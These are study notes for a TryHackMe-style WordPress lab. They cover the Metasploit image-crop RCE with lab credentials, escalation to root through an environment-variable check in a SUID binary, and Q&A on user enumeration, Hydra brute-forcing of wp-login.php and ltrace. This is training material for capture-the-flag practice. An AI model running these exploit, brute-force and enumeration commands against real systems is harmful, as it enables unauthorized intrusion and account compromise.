# THM Lab – WordPress Crop RCE + Privesc (Summary Notes)

## Initial Access (Meterpreter Sessions)

1. **Exploit Used**  (with <u>searchsploit wordpress 5.0</u>)
   `exploit/multi/http/wp_crop_rce` (WordPress Image Crop RCE – CVE-2019-17671 related)

2. **Flow**  
   - Authenticated as `kwheel:cutiepie1` (WP creds)  
   - Uploaded malicious image payload  
   - Included it in theme → got **PHP Meterpreter** (session 1) as `www-data`  
   - Upgraded to **x86/Linux Meterpreter** (session 2) via `shell_to_meterpreter`  

3. **Sessions Summary**  
   - Session 1: PHP/Linux (www-data)  
   - Session 2: x86/Linux (www-data) – more stable for privesc  

   `getsystem` failed → PHP/Linux & x86/Linux Meterpreter do **not** support `priv` extension (only Windows Meterpreter does).

## Privilege Escalation Path

Looked for SUID files :

```sh
find / -user root -perm -4000 -print 2>/dev/null
```

**Key Discovery**: SUID binary `/usr/sbin/checker`

```bash
strings /usr/sbin/checker
...
admin
/bin/bash
Not an Admin
...
setuid
getenv
system
...
```

The logic of the C code likely looks something like this: `if (getenv("admin")) { setuid(0); system("/bin/bash"); } else { printf("Not an Admin"); }`

**Analysis**  
- Binary checks for environment variable **"admin"** using `getenv("admin")`  
- If `admin` is set (any value), calls `setuid(0)` → becomes **root**  
- Then executes `/bin/bash` → root shell  
- If not set → prints "Not an Admin" and exits

**Proof with ltrace** (confirms logic):

```bash
ltrace /usr/sbin/checker
getenv("admin") = "1"
setuid(0) = 0
```

**Exploitation Steps**

1. **Confirm SUID bit** (as www-data or jan):
   ```bash
   ls -l /usr/sbin/checker
   # Expected: -rwsr-xr-x 1 root root ... (SUID bit set)
   ```

2. **Trigger root shell** (one-liner):
   ```bash
   export admin=1
   /usr/sbin/checker
   ```

   → Drops you into **root** bash shell

3. **Post-root actions**:
   ```bash
   whoami          # root
   id              # uid=0(root)
   cd /root
   cat root.txt    # flag!
   ```

**Why this works**  
- Binary is **SUID root** → runs as root  
- Checks `getenv("admin")` → if set, calls `setuid(0)` → becomes root  
- Then runs `/bin/bash` → gives root shell  
- No password / complex exploit needed — trivial env var abuse

**Exam tip**: Always run `find / -perm -u=s -type f 2>/dev/null` to spot SUID binaries — then `strings` + `ltrace` to understand logic.

---
---
## 1. Does WPScan Interact with Protocols and Ports or Just Scan the Website?

**Answer**:  
WPScan **primarily scans the website** (HTTP/HTTPS layer), not lower-level protocols or ports.  

- **How it works**: It sends HTTP requests to the target URL (e.g., http://blog.example.com) to enumerate plugins, themes, users, versions, and vulnerabilities. It doesn't "interact" with ports like a port scanner (e.g., Nmap). It assumes the web port (80/443) is open and focuses on WordPress-specific endpoints like `/wp-json/wp/v2/users` for users or XML-RPC for pingbacks.
- **Port interaction**: Indirect — it needs port 80/443 open, but you can specify custom ports with `--url http://IP:PORT`. No deep protocol interaction (e.g., no SMB, SSH).
- **Noise level**: Medium – sends many HTTP requests, which can trigger WAFs/IDS if aggressive (use `--stealthy` or `--random-user-agent` to reduce).

**Notes tip**: Use WPScan for WP-only sites; for general web enum, use Gobuster/FFUF + Nikto.

## 2. If I Don't Have WPScan in Exam, How to Enum Users? (Ports 80 & 445 Open)

**Answer**:  
Yes, you can enumerate WordPress users without WPScan using manual methods or built-in tools.  

Since you have **port 80** (HTTP) open → focus on WP-specific web endpoints.  
Port **445** (SMB) is not directly useful for WP user enum (SMB is for shares/users on the OS level, not WP-specific).

### All Possible Methods (Exam-Ready, No WPScan)

#### A. Web-based (Port 80 – Most Reliable)
1. **WP JSON API** (default on WP 4.7+ – very common):
   ```bash
   curl -s http://TARGET/wp-json/wp/v2/users | jq   # lists usernames, IDs, slugs
   ```
   - If disabled → try `/wp-json/wp/v2/users/1` (ID 1 = admin often)
   - Abuse: Grab usernames, then brute-force with Hydra

> [!Notes]
>In simple terms, **`jq`** is a command-line "JSON processor." It takes the messy, single-line text data that servers often send and turns it into something readable, searchable, and organized.
>### What the command is doing:
>1. **`curl -s http://...`**: Requests the data from the WordPress API. The `-s` (silent) flag hides the progress bar.
>2. **`|` (The Pipe)**: Grabs the messy output from `curl` and shoves it into `jq`.  
>3. **`jq`**: Automatically **pretty-prints** the data (adds the colors, indentation, and spacing) so you can actually read it.
>### 💡 Pro-Tip: Advanced `jq` Filtering
You don't have to look at all that "bloat." You can tell `jq` to only show you the usernames:
>```
curl -s http://TARGET/wp-json/wp/v2/users | jq '.[].slug'
>```
>**Output:** `"bjoel"` `"kwheel"`

2. **Forgot Password Form** (brute usernames):
   - Visit `/wp-login.php?action=lostpassword`
   - Test usernames → valid user shows "Reset link sent" vs "Invalid user" for fake

#### B. SMB-based (Port 445 – If OS Users Overlap with WP)
- If WP users are also OS users (common in simple labs)
  1. **Null session enum**:
     ```bash
     smbclient -L //TARGET -N
     rpcclient -U "" -N TARGET -c "enumdomusers"
     ```

#### C. Nmap Script
  ```bash
  nmap -p80 --script http-wordpress-users TARGET
  ```

## 3. Hydra WordPress Brute-Force Needs Flag Like HTTP Post Form? (Lab Didn't Use It)

**Answer**:  
No, Hydra doesn't always need a "flag" (failure string) for WordPress brute-force — but it's **highly recommended** for accuracy.

- **In your lab example** (no flag used):  
  The lab probably used **http-post-form without failure string** (`:F=...`), which means Hydra assumes **any non-error response** is success. This can lead to false positives if the form doesn't have a clear failure message.

- **When you need a flag** (`:F=incorrect` or `:Invalid`):  
  For **http-post-form**, it's **optional but best practice** — without it, Hydra can't detect failures reliably (e.g., it might think every attempt succeeds if the page redirects or shows no error).

- **For WP specifically**:
  - WP login form returns "ERROR: The password you entered for the username X is incorrect" on failure.
  - So **use a flag** for reliability:
    ```bash
    hydra -l admin -P rockyou.txt TARGET http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username" -V
    
    #Put failure text in F= not id or name
    ```
  - If the lab didn't use it → their form had a clear success redirect (e.g., 302 to dashboard), so Hydra detected it without a flag.

**Notes tip**: Always use failure flag for precision — test manually with wrong creds first to find the exact "incorrect" string.

## 4. What Does ltrace Do? (Tracking Binary Behavior)

**Answer**:  
`ltrace` is a **library call tracer** — it tracks and prints **all dynamic library calls** (like printf, getenv, setuid, system) made by a binary as it runs.

- **What it does**:  
  Shows **real-time history** of what the binary is doing (calls to libc functions, arguments, return values).  
  - Example: `ltrace /usr/sbin/checker` shows `getenv("admin")`, `setuid(0)`, `system("/bin/bash")`  
  - The "history behavior" is the **sequence of calls** as the program executes (not past history, but live trace).

- **How to use in exam/lab**:  
  ```bash
  ltrace /path/to/binary
  ```

- **Abuse in privesc**:  
  If binary calls `system()` or `getenv()` → you can hijack env vars (e.g. PATH, LD_PRELOAD) or find SUID logic bugs.

**Notes tip**: ltrace for library calls; strace for system calls. Both are gold for analyzing SUID binaries.

## 5. How Did He Know "kwheel Is Not a User in /etc/passwd"? (And Why Not in enum4linux)

**Answer**:  
He likely **deduced it** from the attack flow and tool limitations:

- **enum4linux** only shows **OS users** (from /etc/passwd via SMB/RPC SAMR calls) — it **does not** enumerate **WordPress users** (which are in the WP database, not OS).
- kwheel is a **WP user** (from WPScan or /wp-json/wp/v2/users) — not an OS user → not in /etc/passwd → no SSH access as kwheel (SSH needs OS user).
- **How he knew**:  
  - Tried `ssh kwheel@IP` → failed with "invalid user" or no login
  - Or checked /etc/passwd after getting shell as www-data/john
  - Or enum4linux showed only OS users (bjoel, smb) — no kwheel

**Notes tip**: WP users ≠ OS users. Always check both (WPScan for WP, enum4linux/rpcclient for OS). SSH requires OS user in /etc/passwd.

